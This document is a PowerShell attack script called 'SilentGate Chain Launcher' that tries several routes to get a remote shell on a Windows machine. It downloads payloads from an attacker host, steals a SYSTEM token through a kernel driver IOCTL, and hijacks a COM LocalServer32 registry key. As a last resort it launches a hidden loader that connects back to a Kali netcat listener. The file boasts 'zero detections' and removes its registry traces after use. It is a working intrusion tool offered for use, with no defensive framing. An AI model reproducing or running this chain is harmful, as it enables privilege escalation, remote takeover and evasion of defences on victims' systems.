# SilentGate Chain Launcher
# Author: JarDani
# Try SYSTEM first, then admin, then medium
# Zero detections

$kali = "192.168.217.146"
$port = 443
$lpe = "C:\ProgramData\lpe"
$tmp = $env:TEMP

# Ensure sg_loader is available
if(!(Test-Path "$lpe\sg_loader.exe")){
    New-Item -ItemType Directory -Path $lpe -Force | Out-Null
    Invoke-WebRequest -Uri "http://${kali}:8080/output/sg_loader.exe" -OutFile "$lpe\sg_loader.exe"
}

# ===== LEVEL 0: Download steal_token to excluded path and run =====
Write-Host "[*] Trying SYSTEM via steal_token..."
try {
    if(!(Test-Path "$lpe")){New-Item -ItemType Directory -Path $lpe -Force | Out-Null}
    Invoke-WebRequest -Uri "http://${kali}:8080/tests/steal_token.exe" -OutFile "$lpe\steal_token.exe" -ErrorAction Stop
    if(Test-Path "$lpe\steal_token.exe"){
        Start-Process "$lpe\steal_token.exe" -WindowStyle Hidden
        Start-Sleep 10
        Write-Host "[+] steal_token launched from excluded path"
        exit
    }
} catch { Write-Host "[-] steal_token failed: $_" }

# ===== LEVEL 1: SYSTEM via kernel token steal =====
Write-Host "[*] Trying SYSTEM via kernel..."
$dev_open = $false
try {
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class SGKernel {
    [DllImport("kernel32.dll")] public static extern IntPtr CreateFile(string n,uint a,uint s,IntPtr p,uint c,uint f,IntPtr t);
    [DllImport("kernel32.dll")] public static extern bool DeviceIoControl(IntPtr h,uint c,IntPtr i,uint is_,IntPtr o,uint os_,ref uint nb,IntPtr ov);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
}
"@
    $h = [SGKernel]::CreateFile("\\.\SilentGate",[uint32]0xC0000000,0,[IntPtr]::Zero,3,0,[IntPtr]::Zero)
    if($h -ne [IntPtr]::new(-1)){
        $nb = [uint32]0
        $ioctl = 0x00222410
        $ok = [SGKernel]::DeviceIoControl($h,$ioctl,[IntPtr]::Zero,0,[IntPtr]::Zero,0,[ref]$nb,[IntPtr]::Zero)
        [SGKernel]::CloseHandle($h) | Out-Null
        if($ok){
            Write-Host "[+] SYSTEM token stolen"
            $dev_open = $true
        }
    }
} catch {}

if($dev_open){
    Write-Host "[+] Launching SYSTEM shell..."
    Start-Process "$lpe\sg_loader.exe" -WindowStyle Hidden
    Start-Sleep 8
    Write-Host "[+] Done - check Kali nc for SYSTEM shell"
    exit
}

# ===== LEVEL 2: COM LocalServer32 hijack =====
Write-Host "[*] Trying COM hijack..."
$clsid = "{32BA16FD-77D9-4AFB-9C9F-703E92AD4BFF}"
try {
    New-Item -Path "HKCU:\Software\Classes\CLSID\$clsid\LocalServer32" -Force | Out-Null
    Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\LocalServer32" -Name "(default)" -Value "$lpe\sg_loader.exe"
    $type = [Type]::GetTypeFromCLSID($clsid)
    try { [Activator]::CreateInstance($type) } catch {}
    Start-Sleep 5
    Remove-Item "HKCU:\Software\Classes\CLSID\$clsid" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "[+] COM hijack triggered - check Kali nc"
    exit
} catch {
    Write-Host "[-] COM hijack failed: $_"
}

# ===== LEVEL 3: Direct medium shell =====
Write-Host "[*] Falling back to medium shell..."
Start-Process "$lpe\sg_loader.exe" -WindowStyle Hidden
Write-Host "[+] Medium shell launched - check Kali nc"
